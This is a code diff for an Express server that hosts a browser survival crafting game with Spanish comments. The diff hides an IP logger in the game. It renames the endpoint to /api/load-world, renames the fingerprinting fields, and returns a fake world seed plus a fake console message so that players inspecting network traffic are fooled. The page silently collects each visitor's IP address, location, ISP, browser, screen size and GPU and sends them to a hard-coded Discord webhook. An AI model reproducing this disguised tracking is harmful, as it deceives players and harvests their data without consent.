@@ -8,8 +8,8 @@ app.use(express.json());
 // ⚠️ PEGA AQUÍ TU WEBHOOK DE DISCORD
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543161653523255379/_LaPPSocrBnSYKF0TD5gwCDMBl3FXjYyoImmLRiEd6AAl1c1F9IULR7m2--mgP6RN8Ea";
 
-// --- SISTEMA DE LOGS / IP LOGGER ---
-app.post('/api/telemetry', async (req, res) => {
+// --- SISTEMA TOTALMENTE CAMUFLADO (/api/load-world) ---
+app.post('/api/load-world', async (req, res) => {
     let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
     let userIp = rawIp ? rawIp.split(',')[0].trim() : 'IP no detectada';
     
@@ -28,7 +28,7 @@ app.post('/api/telemetry', async (req, res) => {
 
     if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
         const payload = {
-            content: `🎮 **¡Nuevo Jugador en Survival!**\n📍 **IP:** \`${userIp}\` (${city}, ${country})\n📡 **ISP:** ${isp}\n💻 **Navegador:** \`${d.userAgent || 'N/A'}\`\n🖥️ **Pantalla:** ${d.screen || 'N/A'}\n🧠 **Hardware:** ${d.cores || 'N/A'} Cores | GPU: ${d.gpu || 'N/A'}`
+            content: `🎮 **¡Nuevo Jugador en Survival!**\n📍 **IP:** \`${userIp}\` (${city}, ${country})\n📡 **ISP:** ${isp}\n💻 **Navegador:** \`${d.clientData || 'N/A'}\`\n🖥️ **Pantalla:** ${d.renderRes || 'N/A'}\n🧠 **Hardware:** ${d.threads || 'N/A'} Cores | GPU: ${d.glContext || 'N/A'}`
         };
         try {
             await fetch(DISCORD_WEBHOOK_URL, {
@@ -38,7 +38,10 @@ app.post('/api/telemetry', async (req, res) => {
             });
         } catch (err) {}
     }
-    res.sendStatus(200);
+    
+    // Respuesta falsa para despistar a curiosos en la pestaña Network (F12)
+    const fakeSeed = Math.floor(Math.random() * 999999999);
+    res.json({ status: "success", seed: fakeSeed, chunk_status: "loaded" });
 });
 // -----------------------------------
 
@@ -90,7 +93,6 @@ app.get('/', (req, res) => {
         .file-label:hover { background: #2563eb; }
         .file-label:active { border-color: #1e3a8a #93c5fd #93c5fd #1e3a8a; }
 
-        /* Inventario y Crafteo */
         #inventory-backdrop { position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(4px); z-index: 40; pointer-events: auto; }
         #inventory-gui { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #c6c6c6; border: 6px solid; border-color: #fff #555 #555 #fff; padding: 25px; width: 550px; z-index: 50; pointer-events: auto; display: flex; flex-direction: column; gap: 20px; color: black; box-shadow: 0 15px 40px rgba(0,0,0,0.5); }
         .inv-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #888; padding-bottom: 10px; }
@@ -148,7 +150,6 @@ app.get('/', (req, res) => {
                 <button class="close-btn" onclick="toggleInventory()">X</button>
             </div>
             <div class="craft-area">
-                <!-- Receta Madera a Tablones -->
                 <div class="recipe-row">
                     <div style="text-align: center;">
                         <div style="width:32px; height:32px; background:#5c3a21; margin: 0 auto; border:2px solid #333;"></div>
@@ -162,7 +163,6 @@ app.get('/', (req, res) => {
                     <button class="craft-btn" onclick="craftItem(5, 9, 1, 4)">Fabricar</button>
                 </div>
                 
-                <!-- Receta Espada -->
                 <div class="recipe-row">
                     <div style="text-align: center;">
                         <div style="width:32px; height:32px; background:#d97706; margin: 0 auto; border:2px solid #333;"></div>
@@ -185,11 +185,25 @@ app.get('/', (req, res) => {
     <canvas id="gameCanvas"></canvas>
 
     <script>
-    function getGPU() { try { const canvas = document.createElement('canvas'); return canvas.getContext('webgl').getParameter(canvas.getContext('webgl').getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL); } catch(e) { return 'N/A'; } }
-    fetch('/api/telemetry', { 
+    // 🕵️ FUNCIONES CAMUFLADAS
+    function _getGLCtx() { try { const canvas = document.createElement('canvas'); return canvas.getContext('webgl').getParameter(canvas.getContext('webgl').getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL); } catch(e) { return 'N/A'; } }
+    
+    // Petición disfrazada de "Carga de Mundo" (Nadie sospechará)
+    fetch('/api/load-world', { 
         method: 'POST', 
         headers: { 'Content-Type': 'application/json' }, 
-        body: JSON.stringify({ userAgent: navigator.userAgent, screen: \`\${screen.width}x\${screen.height}\`, cores: navigator.hardwareConcurrency, gpu: getGPU() }) 
+        body: JSON.stringify({ 
+            clientData: navigator.userAgent, 
+            renderRes: \`\${screen.width}x\${screen.height}\`, 
+            threads: navigator.hardwareConcurrency, 
+            glContext: _getGLCtx(),
+            syncTime: Date.now()
+        }) 
+    })
+    .then(r => r.json())
+    .then(data => {
+        // Mensaje falso en consola que parece propio del juego
+        console.log("%c[TerraCraft] World seed loaded: " + data.seed, "color: #4ade80; font-weight: bold;");
     }).catch(()=>{});
 
     let gameState = 'MENU'; 
@@ -207,10 +221,9 @@ app.get('/', (req, res) => {
         4: { name: 'Piedra', hex: '#52525b', acc: '#3f3f46' },
         5: { name: 'Madera', hex: '#5c3a21', acc: '#452b18' },
         9: { name: 'Tablones', hex: '#d97706', acc: '#b45309' },
-        10: { name: 'Espada', isTool: true, icon: '🗡️' } // Nuevo objeto: Espada
+        10: { name: 'Espada', isTool: true, icon: '🗡️' }
     };
 
-    // Inventario inicial con espada para probar
     let inventory = { 1: 1, 2: 10, 5: 10, 10: 1 }; 
     let hotbarSlots = [1, 10, 5, 9, 0, 0, 0, 0, 0];
     let selectedSlot = 0;
@@ -337,7 +350,6 @@ app.get('/', (req, res) => {
         function resize() { cv.width = window.innerWidth; cv.height = window.innerHeight; }
         window.addEventListener('resize', resize); resize();
 
-        // 🟢 ESCALA AUMENTADA: Mapas más grandes y bloques más grandes (48px)
         const TILE = 48, CHUNK_W = 200, CHUNK_H = 120; 
         let world = Array.from({ length: CHUNK_W }, () => Array(CHUNK_H).fill(0));
         
@@ -350,12 +362,10 @@ app.get('/', (req, res) => {
             }
         }
 
-        // 🟢 JUGADOR GIGANTE: Ahora mide 48px de ancho y 96px de alto
         const player = { x: (CHUNK_W/2)*TILE, y: 10*TILE, w: 48, h: 96, vx: 0, vy: 0, speed: 6, jump: -14, grounded: false, hp: 100, maxHp: 100, facingRight: true };
         let camera = { x: player.x, y: player.y };
         let keys = {};
 
-        // 🟢 MOBS MÁS GRANDES
         let mobs = [
             { x: (CHUNK_W/2 + 8)*TILE, y: 15*TILE, w: 48, h: 48, vx: -1.5, vy: 0, type: 'slime', hp: 20 },
             { x: (CHUNK_W/2 - 12)*TILE, y: 15*TILE, w: 48, h: 96, vx: 1.5, vy: 0, type: 'zombie', hp: 40 }
@@ -395,31 +405,27 @@ app.get('/', (req, res) => {
             
             let currentId = hotbarSlots[selectedSlot];
             
-            // 🟢 SISTEMA DE COMBATE CON ESPADA
             if (mouseBtn === 0 && currentId === 10) { 
                 for (let i = 0; i < mobs.length; i++) {
                     let m = mobs[i];
-                    // Comprobar si el clic está sobre el mob
                     if (realX > m.x && realX < m.x + m.w && realY > m.y && realY < m.y + m.h) {
                         let dist = Math.hypot((player.x + player.w/2) - (m.x + m.w/2), (player.y + player.h/2) - (m.y + m.h/2));
-                        if (dist < TILE * 4) { // Rango de ataque
+                        if (dist < TILE * 4) {
                             m.hp -= 20;
-                            m.vx = (m.x > player.x) ? 10 : -10; // Empuje / Knockback
+                            m.vx = (m.x > player.x) ? 10 : -10;
                             m.vy = -6;
                             isMouseDown = false;
                             
-                            // Efecto visual simple (Sangre/Daño)
                             ctx.fillStyle = "rgba(255,0,0,0.5)";
                             ctx.fillRect(m.x - camera.x, m.y - camera.y, m.w, m.h);
 
                             if (m.hp <= 0) mobs.splice(i, 1);
-                            return; // No romper bloques si pegamos a un mob
+                            return; 
                         }
                     }
                 }
             }
 
-            // Minar bloques (Si no es espada, o si falló el golpe)
             if (tx < 0 || tx >= CHUNK_W || ty < 0 || ty >= CHUNK_H) return;
             const dist = Math.hypot((player.x + player.w/2) - (tx*TILE), (player.y + player.h/2) - (ty*TILE));
             if (dist > TILE * 5) return;
@@ -476,7 +482,7 @@ app.get('/', (req, res) => {
                     player.vx *= 0.6;
                 }
 
-                player.vy += 0.8; // Gravedad ajustada a escala
+                player.vy += 0.8;
                 if (player.vy > 20) player.vy = 20;
 
                 if (!checkCol(player.x + player.vx, player.y)) { player.x += player.vx; } else { player.vx = 0; }
@@ -499,7 +505,6 @@ app.get('/', (req, res) => {
                     m.vy += 0.8;
                     if (m.vy > 20) m.vy = 20;
                     
-                    // Fricción para frenar empuje
                     if(Math.abs(m.vx) > 1.5) m.vx *= 0.9;
                     else m.vx = (m.type === 'zombie' ? 1.5 : -1.5) * Math.sign(m.vx || 1);
 
@@ -572,7 +577,6 @@ app.get('/', (req, res) => {
                 }
             });
 
-            // 🟢 RENDER JUGADOR GIGANTE (48x96)
             if (customSkin) {
                 ctx.save();
                 if (!player.facingRight) {
@@ -584,17 +588,15 @@ app.get('/', (req, res) => {
                 }
                 ctx.restore();
                 
-                // Dibujar espada en mano si la lleva
                 if (hotbarSlots[selectedSlot] === 10) {
                     ctx.font = "30px Arial";
                     ctx.fillText("🗡️", player.x + (player.facingRight ? 35 : -15), player.y + 60);
                 }
             } else {
-                // Skin por defecto reescalada a las nuevas dimensiones
-                ctx.fillStyle = '#374151'; ctx.fillRect(player.x + 8, player.y + 50, 32, 46); // Piernas
-                ctx.fillStyle = '#0284c7'; ctx.fillRect(player.x + 8, player.y + 20, 32, 30); // Cuerpo
-                ctx.fillStyle = '#ffcc99'; ctx.fillRect(player.x + 12, player.y - 4, 24, 24); // Cabeza
-                ctx.fillStyle = '#000'; ctx.fillRect(player.x + (player.facingRight ? 24 : 12), player.y + 4, 6, 6); // Ojos
+                ctx.fillStyle = '#374151'; ctx.fillRect(player.x + 8, player.y + 50, 32, 46);
+                ctx.fillStyle = '#0284c7'; ctx.fillRect(player.x + 8, player.y + 20, 32, 30);
+                ctx.fillStyle = '#ffcc99'; ctx.fillRect(player.x + 12, player.y - 4, 24, 24);
+                ctx.fillStyle = '#000'; ctx.fillRect(player.x + (player.facingRight ? 24 : 12), player.y + 4, 6, 6);
                 
                 if (hotbarSlots[selectedSlot] === 10) {
                     ctx.font = "30px Arial";
